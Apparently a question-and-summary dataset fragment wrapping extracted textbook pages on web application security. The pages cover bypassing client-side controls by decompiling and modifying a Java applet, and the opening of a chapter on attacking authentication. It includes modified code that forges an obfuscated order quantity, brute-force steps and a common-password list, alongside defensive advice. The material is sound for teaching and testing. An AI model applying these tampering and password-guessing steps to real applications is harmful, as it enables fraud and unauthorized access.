obfuscated or encrypted data to\nthe server, use your modified version of the component to submit various\nsuitably obfuscated attack strings to the server to probe for vulnerabili-\nties, as you would for any other parameter.\nCoping with Bytecode Obfuscation\nBecause of the ease with which bytecode can be decompiled to recover its\nsource, various techniques have been developed to obfuscate the bytecode itself.\nApplying these techniques results in bytecode that is harder to decompile or that\ndecompiles to misleading or invalid source code that may be very diffi cult to\nunderstand and impossible to recompile without substantial effort. For example,\nconsider the following obfuscated Java source:\npackage myapp.interface;\nimport myapp.class.public;\nimport myapp.throw.throw;\ncc0055..iinndddd 114444 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 145\nChapter 5 n Bypassing Client-Side Controls 145\nimport if.if.if.if.else;\nimport java.awt.event.KeyEvent;\npublic class double extends public implements strict\n{\npublic double(j j1)\n{\n_mthif();\n_fldif = j1;\n}\nprivate void _mthif(ActionEvent actionevent)\n{\n_mthif(((KeyEvent) (null)));\nswitch(_fldif._mthnew()._fldif)\n{\ncase 0:\n_fldfloat.setEnabled(false);\n_fldboolean.setEnabled(false);\n_fldinstanceof.setEnabled(false);\n_fldint.setEnabled(false);\nbreak;\n...\nThe obfuscation techniques commonly employed are as follows:\nn Meaningful class, method, and member variable names are replaced\nwith meaningless expressions such as a, b, and c. This forces the reader\nof decompiled code to identify the purpose of each item by studying how\nit is used. This can make it diffi cult to keep track of different items while\ntracing them through the source code.\nn Going further, some obfuscators replace item names with keywords\nreserved for the language, such as new and int. Although this technically\nrenders the bytecode illegal, most virtual machines (VMs) tolerate the\nillegal code, and it executes normally. However, even if a decompiler\ncan handle the illegal bytecode, the resulting source code is even less\nreadable than that just described. More importantly, the source cannot\nbe recompiled without extensive reworking to consistently rename\nillegally named items.\nn Many obfuscators strip unnecessary debug and meta-information from\nthe bytecode, including source fi lenames and line numbers (which makes\nstack traces less informative), local variable names (which frustrates debug-\nging), and inner class information (which stops refl ection from working\nproperly).\nn Redundant code may be added that creates and manipulates various kinds\nof data in signifi cant-looking ways but that is autonomous from the real\ndata actually being used by the application’s functionality.\ncc0055..iinndddd 114455 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 146\n146 Chapter 5 n Bypassing Client-Side Controls\nn The path of execution through code can be modifi ed in convoluted ways,\nthrough the use of jump instructions, so that the logical sequence of execu-\ntion is hard to discern when reading through the decompiled source.\nn Illegal programming constructs may be introduced, such as unreachable\nstatements and code paths with missing return statements. Most VMs\ntolerate these phenomena in bytecode, but the decompiled source cannot\nbe recompiled without correcting the illegal code.\n\nHACK STEPS\nEffective tactics for coping with bytecode obfuscation depend on the tech-\nniques used and the purpose for which you are analyzing the source. Here are\nsome suggestions:\n1. You can review a component for public methods without fully under-\nstanding the source. It should be obvious which methods can be invoked\nfrom JavaScript, and what their signatures are, enabling you to test the\nbehavior of the methods by passing in various inputs.\n2. If class, method, and member variable names have been replaced with\nmeaningless expressions (but not special words reserved by the pro-\ngramming language), you can use the refactoring functionality built into\nmany IDEs to help yourself understand the code. By studying how items\nare used, you can start to assign them meaningful names. If you use the\nrename tool within the IDE, it does a lot of work for you, tracing the item’s\nuse throughout the codebase and renaming it everywhere.\n3. You can actually undo a lot of obfuscation by running the obfuscated byte-\ncode through an obfuscator a second time and choosing suitable options.\nA useful obfuscator for Java is Jode. It can remove redundant code paths\nadded by another obfuscator and facilitate the process of understanding\nobfuscated names by assigning globally unique names to items.\nJava Applets: A Worked Example\nWe will now consider a brief example of decompiling browser extensions by\nlooking at a shopping application that performs input validation within a Java\napplet.\nIn this example, the form that submits the user’s requested order quantity\nlooks like this:\n<form method=”post” action=”Shop.aspx?prod=2” onsubmit=”return\nvalidateForm(this)”>\n<input type=”hidden” name=”obfpad”\nvalue=”klGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigj\nUQm8CIP5HJxpidrPOuQPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEU\ncc0055..iinndddd 114466 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 147\nChapter 5 n Bypassing Client-Side Controls 147\nD9SmG7c”>\n<script>\nfunction validateForm(theForm)\n{\nvar obfquantity =\ndocument.CheckQuantityApplet.doCheck(\ntheForm.quantity.value, theForm.obfpad.value);\nif (obfquantity == undefined)\n{\nalert(‘Please enter a valid quantity.’);\nreturn false;\n}\ntheForm.quantity.value = obfquantity;\nreturn true;\n}\n</script>\n<applet code=”CheckQuantity.class” codebase=”/scripts” width=”0”\nheight=”0”\nid=”CheckQuantityApplet”></applet>\nProduct: Samsung Multiverse <br/>\nPrice: 399 <br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”submit” value=”Buy”>\n</form>\nWhen the form is submitted with a quantity of 2, the following request is made:\nPOST /shop/154/Shop.aspx?prod=2 HTTP/1.1\nHost: mdsec.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nobfpad=klGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigjUQm8CIP5\nHJxpidrPOuQ\nPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEUD9SmG7c&quantity=4b282c510f\n776a405f465\n877090058575f445b536545401e4268475e105b2d15055c5d5204161000\nAs you can see from the HTML code, when the form is submitted, the vali-\ndation script passes the user’s supplied quantity, and the value of the obfpad\nparameter, to a Java applet called CheckQuantity. The applet apparently performs\nthe necessary input validation and returns to the script an obfuscated version\nof the quantity, which is then submitted to the server.\nSince the server-side application confi rms our order for two units, it is clear\nthat the quantity parameter somehow contains the value we have requested.\nHowever, if we try to modify this parameter without knowledge of the obfusca-\ntion algorithm, the attack fails, presumably because the server fails to unpack\nour obfuscated value correctly.\ncc0055..iinndddd 114477 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 148\n148 Chapter 5 n Bypassing Client-Side Controls\nIn this situation, we can use the methodology already described to decompile\nthe Java applet and understand how it functions. First, we need to download\nthe bytecode for the applet from the URL specifi ed in the applet tag of the\nHTML page:\n/scripts/CheckQuantity.class\nSince the executable is not packaged as a .jar fi le, there is no need to unpack\nit, and we can run Jad directly on the downloaded .class fi le:\nC:\\tmp>jad CheckQuantity.class\nParsing CheckQuantity.class...The class file version is 50.0 (only 45.3,\n\n46.0 and 47.0 are supported)\nGenerating CheckQuantity.jad\nCouldn’t fully decompile method doCheck\nCouldn’t resolve all exception handlers in method doCheck\nJad outputs the decompiled source code as a .jad fi le, which we can view in\nany text editor:\n// Decompiled by Jad v1.5.8f. Copyright 2001 Pavel Kouznetsov.\n// Jad home page: http://www.kpdus.com/jad.html\n// Decompiler options: packimports(3)\n// Source File Name: CheckQuantity.java\nimport java.applet.Applet;\npublic class CheckQuantity extends Applet\n{\npublic CheckQuantity()\n{\n}\npublic String doCheck(String s, String s1)\n{\nint i = 0;\ni = Integer.parseInt(s);\nif(i <= 0 || i > 50)\nreturn null;\nbreak MISSING_BLOCK_LABEL_26;\nException exception;\nexception;\nreturn null;\nString s2 = (new StringBuilder()).append(“rand=”).append\n(Math.random()).append(“&q=”).append(Integer.toString(i)).append\n(“&checked=true”).toString();\nStringBuilder stringbuilder = new StringBuilder();\nfor(int j = 0; j < s2.length(); j++)\n{\nString s3 = (new StringBuilder()).append(‘0’).append\n(Integer.toHexString((byte)s1.charAt((j * 19 + 7) % s1.length()) ^\ns2.charAt(j))).toString();\ncc0055..iinndddd 114488 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 149\nChapter 5 n Bypassing Client-Side Controls 149\nint k = s3.length();\nif(k > 2)\ns3 = s3.substring(k - 2, k);\nstringbuilder.append(s3);\n}\nreturn stringbuilder.toString();\n}\n}\nAs you can see from the decompiled source, Jad has done a reasonable job of\ndecompiling, and the source code for the applet is simple. When the doCheck\nmethod is called with the user-supplied quantity and application-supplied\nobfpad parameters, the applet fi rst validates that the quantity is a valid num-\nber and is between 1 and 50. If so, it builds a string of name/value pairs using\nthe URL querystring format, which includes the validated quantity. Finally, it\nobfuscates this string by performing XOR operations against characters with the\nobfpad string that the application supplied. This is a fairly easy and common\nway of adding some superfi cial obfuscation to data to prevent trivial tampering.\nWe have described various approaches you can take when you have decom-\npiled and analyzed the source code for a browser extension component. In this\ncase, the easiest way to subvert the applet is as follows:\n1. Modify the doCheck method to remove the input validation, allowing you\nto supply an arbitrary string as your quantity.\n2. Add a main method, allowing you to execute the modifi ed component\nfrom the command line. This method simply calls the modifi ed doCheck\nmethod and prints the obfuscated result to the console.\nWhen you have made these changes, the modifi ed source code is as follows:\npublic class CheckQuantity\n{\npublic static void main(String[] a)\n{\nSystem.out.println(doCheck(“999”,\n“klGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigjUQm8CIP5HJxpi\ndrPOuQPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEUD9 SmG7c”));\n}\npublic static String doCheck(String s, String s1)\n{\nString s2 = (new StringBuilder()).append(“rand=”).append\n(Math.random()).append(“&q=”).append(s).append\n(“&checked=true”).toString();\nStringBuilder stringbuilder = new StringBuilder();\nfor(int j = 0; j < s2.length(); j++)\n{\nString s3 = (new StringBuilder()).append(‘0’).append\ncc0055..iinndddd 114499 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 150\n150 Chapter 5 n Bypassing Client-Side Controls\n(Integer.toHexString((byte)s1.charAt((j * 19 + 7) % s1.length()) ^\ns2.charAt(j))).toString();\nint k = s3.length();\nif(k > 2)\ns3 = s3.substring(k - 2, k);\nstringbuilder.append(s3);\n}\nreturn stringbuilder.toString();\n}\n}\nThis version of the modifi ed component provides a valid obfuscated string\nfor the arbitrary quantity of 999. Note that you could use nonnumeric input\nhere, allowing you to probe the application for various kinds of input-based\nvulnerabilities.\nTIP The Jad program saves its decompiled source code with the .jad exten-\nsion. However, if you want to modify and recompile the source code, you need\nto rename each source fi le with the .java extension.\nAll that remains is to recompile the source code using the javac compiler\nthat comes with the Java SDK, and then execute the component from the\ncommand line:\nC:\\tmp>javac CheckQuantity.java\nC:\\tmp>java CheckQuantity\n4b282c510f776a455d425a7808015c555f42585460464d1e42684c414a152b1e0b5a520a\n145911171609\nOur modifi ed component has now performed the necessary obfuscation\non our arbitrary quantity of 999. To deliver the attack to the server, we simply\nneed to submit the order form in the normal way using valid input, intercept\nthe resulting request using our proxy, and substitute the obfuscated quantity\nwith the one provided by our modifi ed component. Note that if the application\nissues a new obfuscation pad each time the order form is loaded, you need to\nensure that the obfuscation pad being submitted back to the server matches the\none that was used to obfuscate the quantity also being submitted.\nTRY IT!\nThese examples demonstrate the attack just described and the corresponding\nattacks using Silverlight and Flash technologies:\nhttp://mdsec.net/shop/154/\nhttp://mdsec.net/shop/167/\nhttp://mdsec.net/shop/179/\ncc0055..iinndddd 115500 88//1199//22001111 1122::0055::4444 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 151\nChapter 5 n Bypassing Client-Side Controls 151\nAttaching a Debugger\nDecompilation is the most complete method of understanding and compromis-\ning a browser extension. However, in large and complex components containing\ntens of thousands of lines of code, it is nearly always much quicker to observe the\ncomponent during execution, correlating methods and classes with key actions\nwithin the interface. This approach also avoids diffi culties that may arise with\ninterpreting and recompiling obfuscated bytecode. Often, achieving a specifi c\nobjective is as simple as executing a key function and altering its behavior to\ncircumvent the controls implemented within the component.\nBecause the debugger is working at the bytecode level, it can be easily used\nto control and understand the fl ow of execution. In particular, if source code\ncan be obtained through decompilation, breakpoints can be set on specifi c\nlines of code, allowing the understanding gained through decompilation to be\nsupported by practical observation of the code path taken during execution.\nAlthough effi cient debuggers are not fully matured for all the browser exten-\nsion technologies, debugging is well supported for Java applets. By far the best\nresource for this is JavaSnoop, a Java debugger that can integrate Jad to decom-\npile source code, trace variables through an application, and set breakpoints on\nmethods to view and modify parameters. Figure 5-6 shows JavaSnoop being\nused to hook directly into a Java applet running in the browser. Figure 5-7\nshows JavaSnoop being used to tamper with the return value from a method.\nFigure 5-6: JavaSnoop can hook directly into an\napplet running in the browser\nNOTE It’s best to run JavaSnoop before the target applet is loaded.\nJavaSnoop turns off the restrictions set by your Java security policy so that it\ncan operate on the target. In Windows, it does this by granting all permissions\nto all Java programs on your system, so ensure that JavaSnoop shuts down\ncleanly and that permissions are restored when you are fi nished working.\nAn alternative tool for debugging Java is JSwat, which is highly confi gu-\nrable. In large projects containing many class fi les, it is sometimes preferable\ncc0055..iinndddd 115511 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 152\n152 Chapter 5 n Bypassing Client-Side Controls\nto decompile, modify, and recompile a key class fi le and then use JSwat to hot-\nswap it into the running application. To use JSwat, you need to launch an applet\nusing the appletviewer tool included in the JDK and then connect JSwat to it.\nFor example, you could use this command:\nappletviewer -J-Xdebug -J-Djava.compiler=NONE -J-\nXrunjdwp:transport=dt_socket,\nserver=y,suspend=n,address=5000 appletpage.htm\nFigure 5-7: Once a suitable method has been identified, JavaSnoop can be used to\ntamper with the return value from the method\nWhen you’re working on Silverlight objects, you can use the Silverlight Spy\ntool to monitor the component’s execution at runtime. This can greatly help\ncorrelate relevant code paths to events that occur within the user interface.\nSilverlight Spy is available from the following URL:\nhttp://firstfloorsoftware.com/SilverlightSpy/\ncc0055..iinndddd 115522 88//1199//22001111 1122::0055::4444 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 153\nChapter 5 n Bypassing Client-Side Controls 153\nNative Client Components\nSome applications need to perform actions within the user’s computer that cannot\nbe conducted from inside a browser-based VM sandbox. In terms of client-side\nsecurity controls, here are some examples of this functionality:\nn Verifying that a user has an up-to-date virus scanner\nn Verifying that proxy settings and other corporate confi guration are in force\nn Integrating with a smartcard reader\nTypically, these kinds of actions require the use of native code components,\nwhich integrate local application functionality with web application functional-\nity. Native client components are often delivered via ActiveX controls. These are\ncustom browser extensions that run outside the browser sandbox.\nNative client components may be signifi cantly harder to decipher than other\nbrowser extensions, because there is no equivalent to intermediate bytecode.\nHowever, the principles of bypassing client-side controls still apply, even if this\nrequires a different toolset. Here are some examples of popular tools used for\nthis task:\nn OllyDbg is a Windows debugger that can be used to step through native\nexecutable code, set breakpoints, and apply patches to executables, either\non disk or at runtime.\nn IDA Pro is a disassembler that can produce human-readable assembly\ncode from native executable code on a wide variety of platforms.\nAlthough a full-blown description is outside the scope of this book, the fol-\nlowing are some useful resources if you want to know more about reverse\nengineering of native code components and related topics:\nn Reversing:SecretsofReverseEngineering by Eldad Eilam\nn HackerDisassemblingUncovered by Kris Kaspersky\nn TheArtofSoftwareSecurityAssessment by Mark Dowd, John McDonald,\nand Justin Schuh\nn FuzzingforSoftwareSecurityTestingandQualityAssurance (ArtechHouse\nInformation Security and Privacy) by Ari Takanen, Jared DeMott, and\nCharlie Miller\nn TheIDAProBook:TheUnoffi cialGuidetotheWorld’sMostPopularDisassembler\nby Chris Eagle\nn www.acm.uiuc.edu/sigmil/RevEng\nn www.uninformed.org/?v=1&a=7\ncc0055..iinndddd 115533 88//1199//22001111 1122::0055::4455 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 154\n154 Chapter 5 n Bypassing Client-Side Controls\nHandling Client-Side Data Securely\nAs you have seen, the core security problem with web applications arises because\nclient-side components and user input are outside the server’s direct control.\nThe client, and all the data received from it, is inherently untrustworthy.\nTransmitting Data Via the Client\nMany applications leave themselves exposed because they transmit critical data\nsuch as product prices and discount rates via the client in an unsafe manner.\nIf possible, applications should avoid transmitting this kind of data via the\nclient. In virtually any conceivable scenario, it is possible to hold such data on\nthe server and reference it directly from server-side logic when needed. For\nexample, an application that receives users’ orders for various products should\nallow users to submit a product code and quantity and look up the price of each\nrequested product in a server-side database. There is no need for users to submit\nthe prices of items back to the server. Even where an application offers different\nprices or discounts to different users, there is no need to depart from this model.\nPrices can be held within the database on a per-user basis, and discount rates\ncan be stored in user profi les or even session objects. The application already\npossesses, server-side, all the information it needs to calculate the price of a\nspecifi c product for a specifi c user. It must. Otherwise, it would be unable, on\nthe insecure model, to store this price in a hidden form fi eld.\nIf developers decide they have no alternative but to transmit critical data via\nthe client, the data should be signed and/or encrypted to prevent user tamper-\ning. If this course of action is taken, there are two important pitfalls to avoid:\nn Some ways of using signed or encrypted data may be vulnerable to\nreplay attacks. For example, if the product price is encrypted before\nbeing stored in a hidden fi eld, it may be possible to copy the encrypted\nprice of a cheaper product and submit it in place of the original price.\nTo prevent this attack, the application needs to include suffi cient context\nwithin the encrypted data to prevent it from being replayed in a differ-\nent context. For example, the application could concatenate the product\ncode and price, encrypt the result as a single item, and then validate\nthat the encrypted string submitted with an order actually matches the\nproduct being ordered.\nn If users know and/or control the plaintext value of encrypted strings that\nare sent to them, they may be able to mount various cryptographic attacks\nto discover the encryption key the server is using. Having done this, they\ncan encrypt arbitrary values and fully circumvent the protection offered\nby the solution.\ncc0055..iinndddd 115544 88//1199//22001111 1122::0055::4455 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 155\nChapter 5 n Bypassing Client-Side Controls 155\nIn applications running on the ASP.NET platform, it is advisable never to\nstore any customized data within the ViewState — especially anything sensi-\ntive that you would not want to be displayed on-screen to users. The option to\nenable the ViewState MAC should always be activated.\nValidating Client-Generated Data\nData generated on the client and transmitted to the server cannot in principle\nbe validated securely on the client:\nn Lightweight client-side controls such as HTML form fi elds and JavaScript\ncan be circumvented easily and provide no assurance about the input that\nthe server receives.\nn Controls implemented in browser extension components are sometimes\nmore diffi cult to circumvent, but this may merely slow down an attacker\nfor a short period.\nn Using heavily obfuscated or packed client-side code provides additional\nobstacles; however, a determined attacker can always overcome these.\n(A point of comparison in other areas is the use of DRM technologies to\nprevent users from copying digital media fi les. Many companies have\ninvested heavily in these client-side controls, and each new solution usu-\nally is broken within a short time.)\nThe only secure way to validate client-generated data is on the server side of\nthe application. Every item of data received from the client should be regarded\nas tainted and potentially malicious.\n\nCOMMON MYTH\nIt is sometimes believed that any use of client-side controls is bad. In particu-\nlar, some professional penetration testers report the presence of client-side\ncontrols as a “fi nding” without verifying whether they are replicated on the\nserver or whether there is any non-security explanation for their existence. In\nfact, despite the signifi cant caveats arising from the various attacks described\nin this chapter, there are nevertheless ways to use client-side controls that do\nnot give rise to any security vulnerabilities:\nn Client-side scripts can be used to validate input as a means of enhanc-\ning usability, avoiding the need for round-trip communication with the\nserver. For example, if the user enters her date of birth in an incorrect\nformat, alerting her to the problem via a client-side script provides a\nmuch more seamless experience. Of course, the application must revali-\ndate the item submitted when it arrives at the server.\nContinued\ncc0055..iinndddd 115555 88//1199//22001111 1122::0055::4455 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 156\n156 Chapter 5 n Bypassing Client-Side Controls\nCOMMON MYTH (continued)\nn Sometimes client-side data validation can be effective as a security\nmeasure — for example, as a defense against DOM-based cross-site\nscripting attacks. However, these are cases where the focus of the attack\nis another application user, rather than the server-side application,\nand exploiting a potential vulnerability does not necessarily depend on\ntransmitting any malicious data to the server. See Chapters 12 and 13\nfor more details on this kind of scenario.\nn As described previously, there are ways of transmitting encrypted data\nvia the client that are not vulnerable to tampering or replay attacks.\nLogging and Alerting\nWhen an application employs mechanisms such as length limits and JavaScript-\nbased validation to enhance performance and usability, these should be inte-\ngrated with server-side intrusion detection defenses. The server-side logic that\nperforms validation of client-submitted data should be aware of the validation\nthat has already occurred on the client side. If data that would have been blocked\nby client-side validation is received, the application may infer that a user is\nactively circumventing this validation and therefore is likely to be malicious.\nAnomalies should be logged and, if appropriate, application administrators\nshould be alerted in real time so that they can monitor any attempted attack\nand take suitable action as required. The application may also actively defend\nitself by terminating the user’s session or even suspending his account.\nNOTE In some cases where JavaScript is employed, the application still can\nbe used by users who have disabled JavaScript within their browsers. In this\nsituation, the browser simply skips JavaScript-based form validation code, and\nthe raw input entered by the user is submitted. To avoid false positives, the log-\nging and alerting mechanism should be aware of where and how this can arise.\nSummary\nVirtually all client/server applications must accept the fact that the client com-\nponent, and all processing that occurs on it, cannot be trusted to behave as\nexpected. As you have seen, the transparent communications methods gener-\nally employed by web applications mean that an attacker equipped with simple\ntools and minimal skill can easily circumvent most controls implemented on\nthe client. Even where an application attempts to obfuscate data and processing\nresiding on the client side, a determined attacker can compromise these defenses.\ncc0055..iinndddd 115566 88//1199//22001111 1122::0055::4455 PPMM",
    "question": "What are the methods for bypassing client-side input validation in web applications, and how can an attacker determine whether server-side validation is present?",
    "summary": "The text discusses methods to bypass client-side input validation in web applications. It explains how browsers can cache resources, and how intercepting and modifying requests can bypass validation. It also covers techniques for bypassing JavaScript-based validation, such as disabling JavaScript or modifying form data. Browser extensions like Java applets, Flash, and Silverlight are also discussed, with methods for decompiling and modifying their bytecode. The text emphasizes that client-side validation is not reliable and that server-side validation is essential for security. It also highlights that some client-side controls can be useful for usability and performance but should not replace server-side checks. Finally, it notes that even obfuscated or encrypted client-side data can be compromised if not properly validated on the server."
  },
  {
    "start": 123,
    "end": 123,
    "text": "Stuttard c05.indd V3 - 07/22/2011 Page 157\nChapter 5 n Bypassing Client-Side Controls 157\nIn every instance where you identify data being transmitted via the client, or\nvalidation of user-supplied input being implemented on the client, you should\ntest how the server responds to unexpected data that bypasses those controls.\nOften, serious vulnerabilities lurk behind an application’s assumptions about\nthe protection afforded to it by defenses that are implemented at the client.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. How can data be transmitted via the client in a way that prevents tamper-\ning attacks?\n2. An application developer wants to stop an attacker from performing brute-\nforce attacks against the login function. Because the attacker may target\nmultiple usernames, the developer decides to store the number of failed\nattempts in an encrypted cookie, blocking any request if the number of\nfailed attempts exceeds fi ve. How can this defense be bypassed?\n3. An application contains an administrative page that is subject to rigor-\nous access controls. It contains links to diagnostic functions located on a\ndifferent web server. Access to these functions should also be restricted\nto administrators only. Without implementing a second authentication\nmechanism, which of the following client-side mechanisms (if any) could\nbe used to safely control access to the diagnostic functionality? Do you\nneed any more information to help choose a solution?\n(a) The diagnostic functions could check the HTTP Referer header to\nconfi rm that the request originated on the main administrative page.\n(b) The diagnostic functions could validate the supplied cookies to confi rm\nthat these contain a valid session token for the main application.\n(c) The main application could set an authentication token in a hidden fi eld\nthat is included within the request. The diagnostic function could vali-\ndate this to confi rm that the user has a session on the main application.\n4. If a form fi eld includes the attribute disabled=true, it is not submitted\nwith the rest of the form. How can you change this behavior?\n5. Are there any means by which an application can ensure that a piece of\ninput validation logic has been run on the client?\ncc0055..iinndddd 115577 88//1199//22001111 1122::0055::4455 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 158\ncc0055..iinndddd 115588 88//1199//22001111 1122::0055::4466 PPMM",
    "question": "How can an application ensure that diagnostic functions accessed through an administrative page are also restricted to administrators only without implementing a second authentication mechanism?",
    "summary": "Testing server responses to unexpected client-side data is crucial for identifying vulnerabilities that may exist despite client-side protections. Developers should ensure that server-side validation is in place to handle data that bypasses client-side controls. A common way to bypass client-side defenses is by manipulating the data before it reaches the server, which can allow attackers to exploit weaknesses in the application's logic."
  },
  {
    "start": 124,
    "end": 152,
    "text": "Stuttard c06.indd V3 - 07/22/2011 Page 159\n\nCHAPTER\n6\nAttacking Authentication\nOn the face of it, authentication is conceptually among the simplest of all the\nsecurity mechanisms employed within web applications. In the typical case, a\nuser supplies her username and password, and the application must verify that\nthese items are correct. If so, it lets the user in. If not, it does not.\nAuthentication also lies at the heart of an application’s protection against\nmalicious attack. It is the front line of defense against unauthorized access. If an\nattacker can defeat those defenses, he will often gain full control of the applica-\ntion’s functionality and unrestricted access to the data held within it. Without\nrobust authentication to rely on, none of the other core security mechanisms\n(such as session management and access control) can be effective.\nIn fact, despite its apparent simplicity, devising a secure authentication func-\ntion is a subtle business. In real-world web applications authentication often is\nthe weakest link, which enables an attacker to gain unauthorized access. The\nauthors have lost count of the number of applications we have fundamentally\ncompromised as a result of various defects in authentication logic.\nThis chapter looks in detail at the wide variety of design and implementa-\ntion fl aws that commonly affl ict web applications. These typically arise because\napplication designers and developers fail to ask a simple question: What could\nan attacker achieve if he targeted our authentication mechanism? In the majority\nof cases, as soon as this question is asked in earnest of a particular application,\na number of potential vulnerabilities materialize, any one of which may be\nsuffi cient to break the application.\n159\ncc0066..iinndddd 115599 88//1199//22001111 1122::0066::3366 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 160\n160 Chapter 6 n Attacking Authentication\nMany of the most common authentication vulnerabilities are no-brainers.\nAnyone can type dictionary words into a login form in an attempt to guess\nvalid passwords. In other cases, subtle defects may lurk deep within the appli-\ncation’s processing that can be uncovered and exploited only after painstaking\nanalysis of a complex multistage login mechanism. We will describe the full\nspectrum of these attacks, including techniques that have succeeded in breaking\nthe authentication of some of the most security-critical and robustly defended\nweb applications on the planet.\nAuthentication Technologies\nA wide range of technologies are available to web application developers when\nimplementing authentication mechanisms:\nn HTML forms-based authentication\nn Multifactor mechanisms, such as those combining passwords and physi-\ncal tokens\nn Client SSL certifi cates and/or smartcards\nn HTTP basic and digest authentication\nn Windows-integrated authentication using NTLM or Kerberos\nn Authentication services\nBy far the most common authentication mechanism employed by web applica-\ntions uses HTML forms to capture a username and password and submit these\nto the application. This mechanism accounts for well over 90% of applications\nyou are likely to encounter on the Internet.\nIn more security-critical Internet applications, such as online banking, this\nbasic mechanism is often expanded into multiple stages, requiring the user to\nsubmit additional credentials, such as a PIN or selected characters from a secret\nword. HTML forms are still typically used to capture relevant data.\nIn the most security-critical applications, such as private banking for high-worth\nindividuals, it is common to encounter multifactor mechanisms using physical\ntokens. These tokens typically produce a stream of one-time passcodes or per-\nform a challenge-response function based on input specifi ed by the application.\nAs the cost of this technology falls over time, it is likely that more applications\nwill employ this kind of mechanism. However, many of these solutions do not\nactually address the threats for which they were devised — primarily phishing\nattacks and those employing client-side Trojans.\nSome web applications employ client-side SSL certifi cates or cryptographic\nmechanisms implemented within smartcards. Because of the overhead of adminis-\ntering and distributing these items, they are typically used only in security-critical\ncc0066..iinndddd 116600 88//1199//22001111 1122::0066::3377 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 161\nChapter 6 n Attacking Authentication 161\ncontexts where an application’s user base is small, such as web-based VPNs for\nremote offi ce workers.\nThe HTTP-based authentication mechanisms (basic, digest, and Windows-\nintegrated) are rarely used on the Internet. They are much more commonly\nencountered in intranet environments where an organization’s internal users\ngain access to corporate applications by supplying their normal network or\ndomain credentials. The application then processes these credentials using one\nof these technologies.\nThird-party authentication services such as Microsoft Passport are occasion-\nally encountered, but at the present time they have not been adopted on any\nsignifi cant scale.\nMost of the vulnerabilities and attacks that arise in relation to authentication\ncan be applied to any of the technologies mentioned. Because of the overwhelm-\ning dominance of HTML forms-based authentication, we will describe each\nspecifi c vulnerability and attack in that context. Where relevant, we will point\nout any specifi c differences and attack methodologies that are relevant to the\nother available technologies.\nDesign Flaws in Authentication Mechanisms\nAuthentication functionality is subject to more design weaknesses than any\nother security mechanism commonly employed in web applications. Even\nin the apparently simple, standard model where an application authenticates\nusers based on their username and password, shortcomings in the design of\nthis model can leave the application highly vulnerable to unauthorized access.\nBad Passwords\nMany web applications employ no or minimal controls over the quality of users’\npasswords. It is common to encounter applications that allow passwords that are:\nn Very short or blank\nn Common dictionary words or names\nn The same as the username\nn Still set to a default value\nFigure 6-1 shows an example of weak password quality rules. End users typi-\ncally display little awareness of security issues. Hence, it is highly likely that\nan application that does not enforce strong password standards will contain a\nlarge number of user accounts with weak passwords set. An attacker can easily\nguess these account passwords, granting him or her unauthorized access to the\napplication.\ncc0066..iinndddd 116611 88//1199//22001111 1122::0066::3377 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 162\n162 Chapter 6 n Attacking Authentication\nFigure 6-1: An application that enforces weak password quality rules\n\nHACK STEPS\nAttempt to discover any rules regarding password quality:\n1. Review the website for any description of the rules.\n2. If self-registration is possible, attempt to register several accounts with\ndifferent kinds of weak passwords to discover what rules are in place.\n3. If you control a single account and password change is possible, attempt\nto change your password to various weak values.\nNOTE If password quality rules are enforced only through client-side con-\ntrols, this is not itself a security issue, because ordinary users will still be\nprotected. It is not normally a threat to an application’s security that a crafty\nattacker can assign himself a weak password.\nTRY IT!\nhttp://mdsec.net/auth/217/\nBrute-Forcible Login\nLogin functionality presents an open invitation for an attacker to try to guess\nusernames and passwords and therefore gain unauthorized access to the appli-\ncation. If the application allows an attacker to make repeated login attempts\ncc0066..iinndddd 116622 88//1199//22001111 1122::0066::3377 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 163\nChapter 6 n Attacking Authentication 163\nwith different passwords until he guesses the correct one, it is highly vulnerable\neven to an amateur attacker who manually enters some common usernames\nand passwords into his browser.\nRecent compromises of high-profi le sites have provided access to hundreds\nof thousands of real-world passwords that were stored either in cleartext or\nusing brute-forcible hashes. Here are the most popular real-world passwords:\nn password\nn website name\nn 12345678\nn qwerty\nn abc123\nn 111111\nn monkey\nn 12345\nn letmein\nNOTE Administrative passwords may in fact be weaker than the password\npolicy allows. They may have been set before the policy was in force, or they\nmay have been set up through a different application or interface.\nIn this situation, any serious attacker will use automated techniques to attempt\nto guess passwords, based on lengthy lists of common values. Given today’s\nbandwidth and processing capabilities, it is possible to make thousands of login\nattempts per minute from a standard PC and DSL connection. Even the most\nrobust passwords will eventually be broken in this scenario.\nVarious techniques and tools for using automation in this way are described\nin detail in Chapter 14. Figure 6-2 shows a successful password-guessing attack\nagainst a single account using Burp Intruder. The successful login attempt can be\nclearly distinguished by the difference in the HTTP response code, the response\nlength, and the absence of the “login incorrect” 